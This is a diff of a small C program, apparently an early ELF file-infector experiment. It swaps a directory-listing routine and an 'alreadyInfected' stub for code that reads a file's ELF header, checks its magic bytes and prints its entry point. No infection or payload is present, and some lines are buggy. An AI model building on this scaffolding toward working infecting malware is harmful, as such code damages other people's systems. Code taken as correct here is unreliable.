@@ -1,49 +1,42 @@
 #include <stdio.h>
-#include <dirent.h>
-#include <sys/stat.h>
-#include <fcntl.h>
+#include <stdlib.h>
 #include <unistd.h>
-#include <sys/syscall.h>
+#include <elf.h>
 #include <string.h>
 
-#define BUFFERSIZE 2048
+int checkifElf(Elf64_Ehdr elfHeader){
+    unsigned char *fileMagicNumbers = elfHeader.e_ident;
 
+    if(fileMagicNumbers[1] == 'E' && fileMagicNumbers[2] == 'L' && fileMagicNumbers[3] == 'F'){
+        return 0;
+    }
 
-int alreadyInfected(){
-
-    return 0;
+    return 1;
 }
 
-int findFilesinDirectory(){
-    int fd;
-    struct linux_dirent64 * directoryEntry;
-    int bytesRead;
-
-    fd = open(".", O_RDONLY);
-    if (fd > 0){
-        printf("[-] error obtaining file descriptor to current working directory\n");
-        return -1;
-    }
+void filesInDirectory(){
     
-    bytesRead = syscall(SYS_getdents, fd, directoryEntry, BUFFERSIZE);
-
-    while (bytesRead > 0){
-        if((strcmp(directoryEntry->d_name, ".") != 0) && (strcmp(directoryEntry->d_name, "..")) != 0 ){
-            printf("File name: %s\n", directoryEntry->d_name);
-        }
-
-        bytesRead = syscall(SYS_getdents, fd, directoryEntry, BUFFERSIZE);
-    }
-
-    return 0;
 }
 
 int main(int argc, char *argv[]){
+    Elf64_Ehdr elfHeader;
+    FILE *filePointer;
+    int result;
 
-    char buffer[5000]; // trying to reserve 5000 bytes of memory to write into
+    filePointer = fopen("target", "rb");
+    if(filePointer == NULL){
+        return 1;
+    }
+    fread(&elfHeader, sizeof(elfHeader), 1, filePointer);
 
-    findFilesinDirectory();
+    unsigned int entryPoint = elfHeader.e_entry;
 
-    printf("Infector Machine\n");
+    printf("The Entry Point is 0x%x\n", entryPoint);
+
+    result = checkifElf(elfHeader);
+    if(result == 0){
+        printf("This is an elf file!\n");
+    }
+
     return 0;
 }
